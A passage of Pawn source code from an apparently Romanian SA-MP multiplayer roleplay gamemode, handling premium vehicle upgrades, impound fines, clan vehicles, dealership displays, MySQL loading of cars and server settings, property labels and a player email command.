	SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai upgradat cu succes vehiculul la VIP PLUS.");
	format(gString, sizeof(gString), "%s si-a upgradat vehiculul %s[id: %d] la unul VIP Plus pentru 500 Premium Points.", GetName(playerid), aVehicleNames[CarInfo[idd][cModel]-400], idd);
	InsertLog(playerid, gString, LOG_SHOP);		
	CarInfo[idd][cVip] = true;	
	CarInfo[idd][cTimeGoto] = gettime();	
	gQuery[0] = EOS;
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `VIP`='%d', `TimeGoto`='%d' WHERE `ID`='%d'", CarInfo[idd][cVip], CarInfo[idd][cTimeGoto], CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery, "", "");
	return 1;
}

Dialog:upgrade_rainbow_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new idd = listitemm[playerid];
	if(CarInfo[idd][Spawned] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul tau nu este spawnat!");
	if(CarInfo[idd][cRainBow]) return SendClientMessage(playerid, -1, "Acest vehicul este deja unul RainBow!");
	if(PlayerInfo[playerid][pPremiumPoints] < 300) return SendClientMessage(playerid, -1, "Nu ai destule Premium Points.");
	PlayerInfo[playerid][pPremiumPoints] -= 300;
	UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	SendClientMessage(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai upgradat cu succes vehiculul la unul RainBow.");
	format(gString, sizeof(gString), "%s si-a upgradat vehiculul %s[id: %d] la unul RainBow pentru 200 Premium Points.", GetName(playerid), aVehicleNames[CarInfo[idd][cModel]-400], idd);
	InsertLog(playerid, gString, LOG_SHOP);
	finishAchievement(playerid, 29);
	CarInfo[idd][cRainBow] = true;
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `RainBow`='%d' WHERE `ID`='%d'", CarInfo[idd][cRainBow], CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery, "", "");
	return 1;
}

Dialog:resetkm_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new idd = listitemm[playerid];
	if(!CarInfo[idd][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul nu este spawnat!");
	PlayerInfo[playerid][pPremiumPoints] -= 200;
	UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	CarInfo[idd][KM] = 0.0;
	mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `KM`='0' WHERE `ID`='%d'", CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery);
	SCMf(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai resetat cu succes kilometrii la vehiculul %s[id: %d].", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID]);
	return 1;
}

Dialog:resetdays_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new idd = listitemm[playerid];
	if(!CarInfo[idd][Spawned]) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Vehiculul nu este spawnat!");
	PlayerInfo[playerid][pPremiumPoints] -= 200;
	UpdateVar(playerid, "GoldPoints", PlayerInfo[playerid][pPremiumPoints]);
	CarInfo[idd][Dayss] = 0;
	mysql_format(SQL, gQuery, 128, "UPDATE `cars` SET `Days`='0' WHERE `ID`='%d'", CarInfo[idd][cID]);
	mysql_tquery(SQL, gQuery);
	SCMf(playerid, COLOR_YELLOW, "* Felicitari! Ti-ai resetat cu succes zilele la vehiculul %s[id: %d].", aVehicleNames[CarInfo[idd][cModel]-400], CarInfo[idd][cID]);
	return 1;
}

Dialog:pay_tax_vehicle(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	if(GetPlayerCash(playerid)<5000000)
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Ai nevoie de $5.000.000 pentru a plati amenda.");
	new vsid = listitemm[playerid];
	GivePlayerCash(playerid, -5000000);
	CarInfo[vsid][Confiscated] = false;
	mysql_format(SQL, gQuery, sizeof(gQuery), "UPDATE `cars` SET `Confiscated`='0' WHERE `ID`='%d'", CarInfo[vsid][cID]);
	mysql_tquery(SQL, gQuery, "", "");
	format(gString, sizeof(gString), "TTC Dispatch: %s (%d) si-a platit amenda in valoare de $5.000.000 pentru a-si recupera vehiculul (dbid:%d)", GetName(playerid), playerid, CarInfo[vsid][cID]);
	SendFactionMessage(8, COLOR_LIGHTBLUE, gString);
	SendClientMessage(playerid, COLOR_MONEY, "Ai platit amenda de $5.000.000 pentru parcarea neregulamentara. Ai grija data viitoare!");
	return 1;
}

stock ShowPlayerClanVehicle(playerid,x=-1) {
	gString="Model\tRank\tDespawn Time\n{FFFFFF}[{1E8003}+{FFFFFF}] Buy a vehicle\n";
	foreach(new car: MyVehicle<PlayerInfo[playerid][pClan]+MAX_PLAYERS>) {
		PlayerInfo[playerid][pCarKey][++x] = car;
		format(gQuery, 128, "%d. %s %s %s\t%d\t%s\n", x+1, 
			CarInfo[car][Spawned] != 0 ? IsVehicleOccupied(CarInfo[car][Spawned]) ? ("[{FFFF00}occupied{FFFFFF}]") : ("[{26B309}spawned{FFFFFF}]") : ("[{F80000}despawned{FFFFFF}]"), 
			GetVehicleName(CarInfo[car][cModel]), 
			TotalUp2(car), 
			CarInfo[car][cRank], 
			CheckDespawnCar(car)
		); 
		strcat(gString, gQuery);
	}
	ShowPlayerDialog(playerid, DIALOG_CLANVEHICLES, DIALOG_STYLE_TABLIST_HEADERS, "{F4AD42}Clan {FFFFFF}Vehicles", gString, "Select", "Cancel");
	return true;
}

stock TotalUp(carid, up=0) {
	srsString[0]=0;
	if(CarInfo[carid][cPremium]) strcat(srsString, "{F86B33}[P] "), up ++;
	if(CarInfo[carid][cRainBow]) strcat(srsString, "{6542F4}[R] "), up ++;
	if(CarInfo[carid][cVip] || strlen(CarInfo[carid][cText]) >= 3) strcat(srsString, CarInfo[carid][cVip] ? "{9DFF00}[VP] ":"{FFD900}[V] "),up++;
	if(CarInfo[carid][cStage]) format(srsString, sizeof srsString, "%s{4286F4}[S:%d/4] ", srsString, CarInfo[carid][cStage]), up ++;
	if(CarInfo[carid][cNeon]) format(srsString, sizeof srsString, "%s{%s}[N] ", srsString, NeonColor[CarInfo[carid][cNeon]-1]), up ++;
	if(CarInfo[carid][cSNeon]) strcat(srsString, "{ff0400}[SN] ");
	if(CarInfo[carid][cPFuel]) strcat(srsString, "{FFD700}[PF] "), up++;
	return up != 0 ? srsString : ("none");
}

stock TotalUpRainbow(carid, up=0) {
	srsString[0]=0;
	if(CarInfo[carid][cRainbows][0]) strcat(srsString, "{ff0000}Red "), up ++;
	if(CarInfo[carid][cRainbows][1]) strcat(srsString, "{002fff}Blue "), up ++;
	if(CarInfo[carid][cRainbows][2]) strcat(srsString, "{00ff15}Green "), up ++;
	if(CarInfo[carid][cRainbows][3]) strcat(srsString, "{fffb00}Yellow "), up ++;
	return up != 0 ? srsString : ("none");
}

stock TotalUp2(carid, up=0) {
	srsString[0]=0;
	if(CarInfo[carid][cRainBow]) strcat(srsString, "{6542F4}[R] "), up ++;
	if(CarInfo[carid][cVip] || strlen(CarInfo[carid][cText]) >= 3) strcat(srsString, CarInfo[carid][cVip] ? "{9DFF00}[VP] ":"{FFD900}[V] "),up++;
	if(CarInfo[carid][cStage]) format(srsString, sizeof srsString, "%s{4286F4}[S:%d/3] ", srsString, CarInfo[carid][cStage]), up ++;
	if(CarInfo[carid][cNeon]) format(srsString, sizeof srsString, "%s{%s}[N] ", srsString, NeonColor[CarInfo[carid][cNeon]-1]), up ++;
	return up != 0 ? srsString : ("");
}

stock TotalUp4(carid, up=0) {
	srsString[0]=0;
	if(CarInfo[carid][cPremium]) strcat(srsString, "P "), up ++;
	if(CarInfo[carid][cRainBow]) strcat(srsString, "R "), up ++;
	if(CarInfo[carid][cVip] || strlen(CarInfo[carid][cText]) >= 3) strcat(srsString, CarInfo[carid][cVip] ? "VP ":"V "),up++;
	if(CarInfo[carid][cStage]) format(srsString, sizeof srsString, "%sS:%d/4 ", srsString, CarInfo[carid][cStage]), up ++;
	if(CarInfo[carid][cNeon]) format(srsString, sizeof srsString, "%sN:%d ", srsString, CarInfo[carid][cNeon]), up ++;
	if(CarInfo[carid][cSNeon]) strcat(srsString, "SN ");
	if(CarInfo[carid][cPFuel]) strcat(srsString, "PF "), up++;
	return srsString;
}

redist::CancelTestDrive(playerid) {
	SetPlayerPos(playerid, 2131.7979,-1150.5887,24.1406);
	SetPlayerInterior(playerid, 0);
	DestroyVehicleEx(DealerCar[playerid], "");
	SetPlayerVirtualWorld(playerid, 0);
	SetCameraBehindPlayer(playerid);
	DealerCar[playerid] = 0;
	TestingModel[playerid] = 0;
	DealerID[playerid] = -1;
	SendClientMessage(playerid, -1, "{EBC334}(Test Drive) {FFFFFF}Test suspendat!");
	return true;
}
redist::ShowDealershipTextdraws(playerid) {
	gString[0] = EOS;
	format(gString, 128, "name: ~y~%s~n~~w~~h~max. speed: ~y~%d~w~~h~ km/h~n~Price: %s$%s~n~~w~~h~Stock: ~y~%d", aVehicleNames[GetVehicleModel(DealerCar[playerid])-400], GetVehicleMaxSpeed(GetVehicleModel(DealerCar[playerid])), GetPlayerCash(playerid) < DSModels[DealerID[playerid]][dPrice] ? ("~r~") : ("~g~"), FormatNumber(DSModels[DealerID[playerid]][dPrice]), DSModels[DealerID[playerid]][dStock]);
	PlayerTextDrawSetString(playerid, InfoDS, gString);
	PlayerTextDrawShow(playerid, InfoDS);
	for(new i = 0; i < 5; i++) TextDrawShowForPlayer(playerid, DSTD[i]);
	if(IsAdmin(playerid, 7)) TextDrawShowForPlayer(playerid, DSTD[5]);
	return true;
}

redist::HideDealershipTextdraws(playerid) {
	for(new i=0;i<6;i++) TextDrawHideForPlayer(playerid, DSTD[i]);
	PlayerTextDrawHide(playerid, InfoDS);
	return true;
}
stock DestroyPlayerCar(dbid,x_SP=true) {
	if(!CarInfo[dbid][Spawned]) return true;
	
	VehicleSQL[CarInfo[dbid][Spawned]] = -1;
	CarInfo[dbid][cTime] = 0;
		
	GetVehiclePos(CarInfo[dbid][Spawned], CarInfo[dbid][cLastPos][0], CarInfo[dbid][cLastPos][1], CarInfo[dbid][cLastPos][2]);
	for(new i = 0; i < 2; i++) if(CarInfo[dbid][cNeonObj][i]) DestroyDynamicObject(CarInfo[dbid][cNeonObj][i]);
	if(CarInfo[dbid][cGarage]!=-1) total_vehicle_in_garage[CarInfo[dbid][cOnline]] --;
	if(x_SP) Iter_Remove(PersonalVSpawned, dbid);
	MyVehicleSpawn[CarInfo[dbid][cOnline]] --;
	CarInfo[dbid][cFuel] = Gas[CarInfo[dbid][Spawned]];
	new engine, lights, alarm, doors, bonnet, boot, objective; gQuery[0] = (EOS);
	GetVehicleParamsEx(CarInfo[dbid][Spawned], engine, lights, alarm, doors, bonnet, boot, objective);
			
	CarInfo[dbid][cLock] = bool:doors;

	DestroyVehicleEx(CarInfo[dbid][Spawned], "");
	CarInfo[dbid][Spawned] = 0;
	return true;
}

stock DestroyClanVehicle(dbid, x_SP=true) {
	if(!CarInfo[dbid][Spawned]) return true;
	
	VehicleSQL[CarInfo[dbid][Spawned]] = -1;
	CarInfo[dbid][cTime] = 0;

	if(x_SP) Iter_Remove(PersonalVSpawned, dbid);
	if(CarInfo[dbid][cNeonObj][0]!=INVALID_OBJECT_ID) DestroyDynamicObject(CarInfo[dbid][cNeonObj][0]), CarInfo[dbid][cNeonObj][0] = INVALID_OBJECT_ID;
	if(CarInfo[dbid][cNeonObj][1]!=INVALID_OBJECT_ID) DestroyDynamicObject(CarInfo[dbid][cNeonObj][1]), CarInfo[dbid][cNeonObj][1] = INVALID_OBJECT_ID;
	if(nameobject[CarInfo[dbid][Spawned]]!=INVALID_OBJECT_ID) DestroyDynamicObject(nameobject[CarInfo[dbid][Spawned]]), nameobject[CarInfo[dbid][Spawned]]=INVALID_OBJECT_ID;
	ClanSpawn[CarInfo[dbid][cClan]] --;
	CarInfo[dbid][cFuel] = Gas[CarInfo[dbid][Spawned]];

	mysql_format(SQL, gQuery, 128, "UPDATE `clanvehicle` SET `Fuel`='%i' WHERE `ID`='%i'", CarInfo[dbid][cFuel], CarInfo[dbid][cID]);
	mysql_tquery(SQL, gQuery, "", "");

	DestroyVehicleEx(CarInfo[dbid][Spawned], "");
	CarInfo[dbid][Spawned] = 0;
	return true;
}

redist::SetTunning(idd) {
    new engine,lights,alarm,doors,bonnet,boot,objective;
	GetVehicleParamsEx(CarInfo[idd][Spawned],engine,lights,alarm,doors,bonnet,boot,objective);
	SetVehicleParamsEx(CarInfo[idd][Spawned],0,lights,alarm,CarInfo[idd][cLock],bonnet,boot,objective);
	for(new i = 0; i < 14; i++) if(CarInfo[idd][cMod][i] != 0) AddVehicleComponent(CarInfo[idd][Spawned], CarInfo[idd][cMod][i]);
	if(strlen(CarInfo[idd][cLicenseColor]) > 5) {
		format(gString, sizeof gString, "{%s}%s", CarInfo[idd][cLicenseColor], CarInfo[idd][cLicense]);
		SetVehicleNumberPlate(CarInfo[idd][Spawned], gString);
		ChangeVehiclePaintjob(CarInfo[idd][Spawned], CarInfo[idd][paintjob]);
		return true;
	}
	else { 
		SetVehicleNumberPlate(CarInfo[idd][Spawned], CarInfo[idd][cLicense]);
		ChangeVehiclePaintjob(CarInfo[idd][Spawned], CarInfo[idd][paintjob]);
	}
	return true;
}

LoopingAnim(playerid, const animlib[], const animname[], Float:Speed, looping, lockx, locky, lockz, lp) {
	ApplyAnimation(playerid, animlib, animname, Speed, looping, lockx, locky, lockz, lp);
}
Float:GetDistanceBetweenPoints(Float:x1, Float:y1, Float:z1, Float:x2, Float:y2, Float:z2) return VectorSize(x1-x2, y1-y2, z1-z2);
stock GetClosestVehicle(playerid, Float:lastd=999999999.0,vehicle=-1,Float:x=0.0,Float:y=0.0,Float:z=0.0,Float:dist=0.0) {
    GetPlayerPos(playerid,x,y,z);
    foreach(new i : StreamedVehicle[playerid]) if(GetPlayerPos(playerid,x,y,z)&&(dist=GetVehicleDistanceFromPoint(i,x,y,z))<lastd) lastd=dist,vehicle=i;
    return vehicle;
}
redist::LoadPlayerCars(playerid) {
	if !cache_num_rows() *then return true;
    
	new result[51];
	for(new i=0; i < cache_num_rows(); i++) {
		new id = Iter_Free(MyVehicle<>);

		cache_get_value_name(i, "Owner", CarInfo[id][cOwner], MAX_PLAYER_NAME);                                                                       
		cache_get_value_name(i, "Text", CarInfo[id][cText]);                                                                       
		cache_get_value_name(i, "License", CarInfo[id][cLicense]);
		cache_get_value_name(i, "LicenseColor", CarInfo[id][cLicenseColor]);

		cache_get_value_name_float(i, "Locationx", CarInfo[id][cLocationx]);                                                                      		
		cache_get_value_name_float(i, "Locationy", CarInfo[id][cLocationy]);                                                                      		
		cache_get_value_name_float(i, "Locationz", CarInfo[id][cLocationz]);                                                                      		
		cache_get_value_name_float(i, "Angle", CarInfo[id][cAngle]);         
		cache_get_value_name_float(i, "KM", CarInfo[id][KM] );    

		cache_get_value_name_int(i, "ID", CarInfo[id][cID]);
		cache_get_value_name_int(i, "Model", CarInfo[id][cModel]);     
		cache_get_value_name_int(i, "Neon", CarInfo[id][cNeon]);                                                                   			                                                         			                                                                  			                                                                    			
		cache_get_value_name_int(i, "ColorOne", CarInfo[id][cColorOne]);                                                                        			
		cache_get_value_name_int(i, "ColorTwo", CarInfo[id][cColorTwo]);                                                                         		
		cache_get_value_name_int(i, "ColorText", CarInfo[id][cTextColor]);                                                                        		
		cache_get_value_name_int(i, "Value", CarInfo[id][cValue]);                                                                        			   
		cache_get_value_name_int(i, "Garage", CarInfo[id][cGarage]);                                                                    			                                                            				                                                                       				
		cache_get_value_name_int(i, "paintjob", CarInfo[id][paintjob]);                                                                       			                                                                  				
		cache_get_value_name_int(i, "Userid", CarInfo[id][Userid]);
		cache_get_value_name_int(i, "TimeGoto", CarInfo[id][cTimeGoto]);                                                                       			
		cache_get_value_name_int(i, "Tax", CarInfo[id][cTax]);                                                                        				
		cache_get_value_name_int(i, "Points", CarInfo[id][cPoints]);                                                                        			
		cache_get_value_name_int(i, "Fuel", CarInfo[id][cFuel]);                                                                    				
		cache_get_value_name_int(i, "RainBow", CarInfo[id][cRainBow]);                                                                        			
		cache_get_value_name_int(i, "Premium", CarInfo[id][cPremium]);                                                                        		
		cache_get_value_name_int(i, "Stage", CarInfo[id][cStage]);                                                                        			                                                                     			
		cache_get_value_name_int(i, "Days", CarInfo[id][Dayss]);    
		cache_get_value_name_int(i, "SNeon", CarInfo[id][cSNeon]);

		cache_get_value_name_bool(i, "Confiscated", CarInfo[id][Confiscated]);                                                                       	                                                                   			
		cache_get_value_name_bool(i, "Lockk", CarInfo[id][cLock]);         
		cache_get_value_name_bool(i, "PFuel", CarInfo[id][cPFuel]);  
		cache_get_value_name_bool(i, "VIP", CarInfo[id][cVip]);     
		cache_get_value_name_bool(i, "CustomLicense", CarInfo[id][cCustomLicense]);

		cache_get_value_name(i, "Rainbows", result),        unformat(result, "p<|>iiii", CarInfo[id][cRainbows][0], CarInfo[id][cRainbows][1], CarInfo[id][cRainbows][2], CarInfo[id][cRainbows][3]);
		cache_get_value_name(i, "NeonObj", result),			unformat(result, "a<i>[2]", CarInfo[id][cNeonObj_]);                 				
		cache_get_value_name(i, "Mods", result),			unformat(result, "a<i>[14]", CarInfo[id][cMod]);			
		cache_get_value_name(i, "Cordonate", result),		unformat(result, "a<f>[6]", CarInfo[id][cVipPos]);

		Iter_Add(MyVehicle<playerid>, id);
	}
	return true;
}

redist::SQL_LoadClanVehicles(clanid) {
	if(!cache_num_rows()) return true;

	new Mods[50],id;
	for(new i=0,j=cache_num_rows();i<j;i++) {
		id=Iter_Free(MyVehicle<>);
		                                                             
		cache_get_value_name_int(i, "ID", CarInfo[id][cID]);
		cache_get_value_name_int(i, "Model", CarInfo[id][cModel]);                                                                  			
		cache_get_value_name_float(i, "Locationx", CarInfo[id][cLocationx]);                                                                      		
		cache_get_value_name_float(i, "Locationy", CarInfo[id][cLocationy]);                                                                      		
		cache_get_value_name_float(i, "Locationz", CarInfo[id][cLocationz]);                                                                      		
		cache_get_value_name_float(i, "Angle", CarInfo[id][cAngle]);                                                                            			
		cache_get_value_name_int(i, "ColorOne", CarInfo[id][cColorOne]);                                                                        			
		cache_get_value_name_int(i, "ColorTwo", CarInfo[id][cColorTwo]);                                                                         		                                                                  		
		cache_get_value_name_int(i, "Value", CarInfo[id][cValue]);                                                                        			                                                                   				                                                                       				
		cache_get_value_name_int(i, "paintjob", CarInfo[id][paintjob]);                                                                       			                                                                  				                                                        			                                                                      			
		cache_get_value_name_int(i, "Fuel", CarInfo[id][cFuel]);                                                                        				
		cache_get_value_name_int(i, "RainBow", CarInfo[id][cRainBow]);                                                                        			                                                                      		
		cache_get_value_name_int(i, "Stage", CarInfo[id][cStage]);      
		cache_get_value_name_int(i, "ClanID", CarInfo[id][cClan]);
		cache_get_value_name_int(i, "Rank", CarInfo[id][cRank]);      
		cache_get_value_name_int(i, "VIP", CarInfo[id][cVip]);
		cache_get_value_name_int(i, "Neon", CarInfo[id][cNeon]);                                                            			                                                                     			
		cache_get_value_name(i, "Mods", Mods);
		CarInfo[id][cTime] = 0;

		sscanf(Mods, "a<i>[14]", CarInfo[id][cMod]);

		cache_get_value_name(i, "NeonObj", Mods);
		sscanf(Mods, "a<i>[2]", CarInfo[id][cNeonObj_]);

		Iter_Add(MyVehicle<clanid+MAX_PLAYERS>, id);
	}
	return true;
}

redist::LoadStuffs() {
	if(!cache_num_rows()) return true;
	new stocks[30];
    cache_get_value_name_int(0, "Tax", Tax);
    cache_get_value_name_int(0, "TaxValue", TaxValue);
    cache_get_value_name_bigint(serverGoal, 0, "goal");
    cache_get_value_name(0, "nickname", server_name);
    cache_get_value_name(0, "password", server_password);
    cache_get_value_name(0, "ServerStock", stocks);
    cache_get_value_name_int(0, "HelperRaport", helper_raport);
    cache_get_value_name_int(0, "AdminRaport", admin_raport);
    cache_get_value_name_int(0, "Payday", payday_power);
    cache_get_value_name_int(0, "ServerBonus", server_bonus);
    sscanf(stocks, "a<i>[9]", ServerStock);
    if OPByte(serverGoal, >=, #3333333333) *then TerminatJobGoal = true;
    UpdateJobGoal(0);
    gString[0] = EOS;
    LoadPickups();
    cache_get_value_name_int(0, "lotto_bets", sql_lotto_bets);
    print("[MySQL]\t\t\tserver stuffs loaded");
    print(" "),print(" "),print(" ");
	return true;
}
redist::LoadDSVeh() {
	dsvehs = cache_num_rows();
	for(new i = 0; i < dsvehs; i++) {
		cache_get_value_name_int(i, "ID", DSModels[i][dID]);				
		cache_get_value_name_int(i, "Model", DSModels[i][dModel]);             
		cache_get_value_name_int(i, "Price", DSModels[i][dPrice]);             
		cache_get_value_name_int(i, "Stock", DSModels[i][dStock]);

	}
	printf("[MySQL]\t\t\tdealership\t\t%d", dsvehs);
}

stock UpdateLabel(update, h) {
	gString[0] = EOS;
	new pret[70];
	switch(update) {
		case 1: {
			MapIconHouse[h] = CreateDynamicMapIcon(HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez], 31, 0,-1,-1,-1,1000.0);
			if(HouseInfo[h][hValue]) format(pret, sizeof(pret), "\n{FFFFFF}Price: {D40000}$%s (/buyhouse)", FormatNumber(HouseInfo[h][hValue]));
			switch(HouseInfo[h][hOwned]) {
				case 0: {
					DestroyDynamicPickup(HouseInfo[h][hPickupID]);
					HouseInfo[h][hPickupID] = CreateDynamicPickup(1273, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]);
					format(gString, 256, "{FFFFFF}House {D40000}%d\n{FFFFFF}Owner: {D40000}The State%s\n{FFFFFF}Level: {D40000}%d%s", HouseInfo[h][hID], HouseInfo[h][hRentabil]?("\n{FFFFFF}Rent: {D40000}$250{FFFFFF}/level (/rentroom)"):(""),HouseInfo[h][hLevel], pret);
					UpdateDynamic3DTextLabelText(HouseLabel[h], 0x0053CFD1, gString);
				}
				case 1: {
					format(gString, 256, "{D40000}%s\n{FFFFFF}House {D40000}%d\n{FFFFFF}Owner: {D40000}%s%s\n{FFFFFF}Level: {D40000}%d%s", HouseInfo[h][hDiscription], HouseInfo[h][hID], HouseInfo[h][hOwner], HouseInfo[h][hRentabil]?("\n{FFFFFF}Rent: {D40000}$250{FFFFFF}/level (/rentroom)"):(""), HouseInfo[h][hLevel], pret);				
					UpdateDynamic3DTextLabelText(HouseLabel[h], 0x0053CFD1, gString);
					DestroyDynamicPickup(HouseInfo[h][hPickupID]);
					HouseInfo[h][hPickupID] = CreateDynamicPickup(1272, 23, HouseInfo[h][hEntrancex], HouseInfo[h][hEntrancey], HouseInfo[h][hEntrancez]);
				}
			}
			PickupInfo[HouseInfo[h][hPickupID]][pkID] = h;
			PickupInfo[HouseInfo[h][hPickupID]][pkType] = 1;
		}
		case 2: {
		    if(BizzInfo[h][bBuyPrice] != 0) format(pret, sizeof(pret), "\n{FFFFFF}Price: {2B6CB2}$%s {FFFFFF}(/buybiz)", FormatNumber(BizzInfo[h][bBuyPrice]));
			switch(BizzInfo[h][bType]) {
				case 15: format(gString, 256, "%s\n{F59842}Paintball Arena\n{FFFFFF}Owner: {F59842}%s\n{FFFFFF}Use ({F59842}/enter{FFFFFF}) to enter in this arena%s", BizzInfo[h][bMessage], BizzInfo[h][bOwner], pret);
				case 17: format(gString, 256, "%s\n{F59842}Race Arena\n{FFFFFF}Owner: {F59842}%s\n{FFFFFF}Use ({F59842}/enter{FFFFFF}) to enter in this arena%s", BizzInfo[h][bMessage], BizzInfo[h][bOwner], pret);
				case 18: format(gString, 256, "%s\n{10B010}Pay 'n' Spray\n{FFFFFF}Owner: {10B010}%s\n{FFFFFF}Press ('{10B010}H{FFFFFF}' key) to enter%s", BizzInfo[h][bMessage], BizzInfo[h][bOwner], pret);
				default: format(gString, 256, "{2B6CB2}%s\n{FFFFFF}Business: {2B6CB2}#%d\n{FFFFFF}Owner: {2B6CB2}%s\n{FFFFFF}Fee: {2B6CB2}$%d\n{FFFFFF}Level: {2B6CB2}%d%s", BizzInfo[h][bMessage], h, BizzInfo[h][bOwner], BizzInfo[h][bFee], BizzInfo[h][bLevel], pret);
			}
			DestroyDynamic3DTextLabel(BizzLabel[h]);
			BizzLabel[h] = CreateDynamic3DTextLabel(gString, COLOR_WHITE,BizzInfo[h][bEntranceX], BizzInfo[h][bEntranceY], BizzInfo[h][bEntranceZ] + (BizzInfo[h][bType]!=18?0.0:1.0),25, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 1, -1, -1, -1, 100.0);
		}
		case 3: {
			DestroyDynamic3DTextLabel(GarageLabel[h]);
			DestroyDynamicPickup(GarageInfo[h][gPickup]);
			format(gString, 252, "Garage {159C00}%d{FFFFFF}\nOwned by {159C00}%s{FFFFFF}\nPress '{159C00}H{FFFFFF}' key to park vehicle in this garage\nPress '{159C00}F{FFFFFF}' key to enter in this garage\n(house: %d)", GarageInfo[h][gID], HouseInfo[GarageInfo[h][gHouses]][hOwner], GarageInfo[h][gHouses]);
			GarageLabel[h] = CreateDynamic3DTextLabel(gString, COLOR_WHITE, GarageInfo[h][gEnterX], GarageInfo[h][gEnterY], GarageInfo[h][gEnterZ], 10);
			GarageInfo[h][gPickup] = CreateDynamicPickup(1273, 23, GarageInfo[h][gEnterX], GarageInfo[h][gEnterY], GarageInfo[h][gEnterZ]);
		}
		case 4: {
			DestroyDynamic3DTextLabel(ClanHqLabel[h]);
			DestroyDynamicPickup(ClanHQInfo[h][cPickup]);
			ClanHQInfo[h][cPickup] = CreateDynamicPickup(19524, 23, ClanHQInfo[h][cPosX], ClanHQInfo[h][cPosY], ClanHQInfo[h][cPosZ]);
			if(ClanHQInfo[h][cClan] != 0) {
				new clanid = ClanHQInfo[h][cClan];
				format(gString, 128,"#%d\nClan Headquarter\nOwner: {%s}%s\n{FFFFFF}(%s)", ClanHQInfo[h][cID], ClanInfo[clanid][clColor], ClanInfo[clanid][clName], ClanHQInfo[h][cStatus]?("locked"):("unlocked"));
			} else format(gString, 128,"#%d\nClan Headquarter\nOwner: None\nPrice: {9ACD32}%d premium points\n{FFFFFF}(use /buyhq)\n(%s)", ClanHQInfo[h][cID], ClanHQInfo[h][cPrice], ClanHQInfo[h][cStatus]?("locked"):("unlocked"));
			ClanHqLabel[h] = CreateDynamic3DTextLabel(gString, COLOR_WHITE, ClanHQInfo[h][cPosX], ClanHQInfo[h][cPosY], ClanHQInfo[h][cPosZ], 10);	
			PickupInfo[ClanHQInfo[h][cPickup]][pkID] = h;
			PickupInfo[ClanHQInfo[h][cPickup]][pkType] = 4;
		}
		case 5: {
			format(gString, 256, "ID: {018C0D}%d\n{018C0D}%s\n{FFFFFF}Job: {018C0D}%s\n{FFFFFF}Level: {018C0D}%d\n{FFFFFF}Owner: {018C0D}%s\n{FFFFFF}Press {018C0D}Y{FFFFFF} to get job.\nPress {018C0D}N{FFFFFF} to quit job.", h, JobInfo[h][jDescription], JobInfo[h][jName], JobInfo[h][jLevel], JobInfo[h][jOwner]);
			UpdateDynamic3DTextLabelText(JobInfo[h][jLabel], -1, gString);
		}
	}
	return true;
}
redist::WeaponObject(wid) {
	switch(wid) {
		case 1: return 331; 
		case 2: return 332; 
		case 3: return 333; 
		case 5: return 334; 
		case 6: return 335; 
		case 7: return 336; 
		case 10: return 321; 
		case 11: return 322; 
		case 12: return 323; 
		case 13: return 324; 
		case 14: return 325; 
		case 15: return 326; 
		case 23: return 347; 
		case 24: return 348; 
		case 25: return 349; 
		case 26: return 350; 
		case 27: return 351; 
		case 28: return 352; 
		case 29: return 353; 
		case 30: return 355; 
		case 31: return 356; 
		case 33: return 357; 
		case 4: return 335; 
		case 34: return 358; 
		case 41: return 365; 
		case 42: return 366; 
		case 43: return 367; 
	}
	return false;
}						
redist::DestroyPickups(turfid) {
	for(new i = 0; i < MAX_PICKUPS; i++) {
		if(Pickups[i][psWar] == turfid) {
			DestroyDynamicPickup(Pickups[i][psID]);
			Pickups[i][psType] = 0;
			Pickups[i][psID] = 0;
			Pickups[i][psWar] = 0;	
		}
	}
	return true;
}
redist::IsAFLYCar(carid) {
	if(GetVehicleModel(carid) == 592 || GetVehicleModel(carid) == 577 || GetVehicleModel(carid) == 511 || GetVehicleModel(carid) == 512 || GetVehicleModel(carid) == 593 || GetVehicleModel(carid) == 520 || GetVehicleModel(carid) == 553 || GetVehicleModel(carid) == 476 || GetVehicleModel(carid) == 519 || GetVehicleModel(carid) == 460 || GetVehicleModel(carid) == 513 || GetVehicleModel(carid) == 487) return true;
	return false;
}
redist::IsABOATCar(carid) {
	new modelid = GetVehicleModel(carid);
	if(modelid == 430 || modelid == 446 || modelid == 452 || modelid == 453 || modelid == 454 || modelid == 472 || modelid == 473 || modelid == 484 || modelid == 493 || modelid == 595) return true;
	return false;
}
cmd:emails(playerid, params[]) {
	if(DeelayCommand[playerid][21]>gettime()) 
		return DeelayTime(playerid, 21);
	
	mysql_format(SQL, gQuery, sizeof gQuery, "SELECT * FROM `emails` WHERE `Name`='%s' ORDER BY `emails`.`ID` DESC LIMIT 10", GetName(playerid));
	mysql_tquery(SQL, gQuery, #sql_check_emails, #i, playerid);
	return true;
}
redist::sql_check_emails(playerid) {
	if !cache_num_rows() *then
		return SendClientMessage(playerid, -1, "You don't have a email!");

	gString[0] = gQuery[0] = 0;
	DeelayCommand[playerid][21] = gettime()+10;
	new i=-1,j=cache_num_rows(), string:text[70], bool:read;
	while(++i!=j) { 
		cache_get_value_name(i, "Text", text, 70);
		cache_get_value_name_int(i, "ID", EmailID[playerid][i]);
		cache_get_value_name_bool(i, "Read", read);
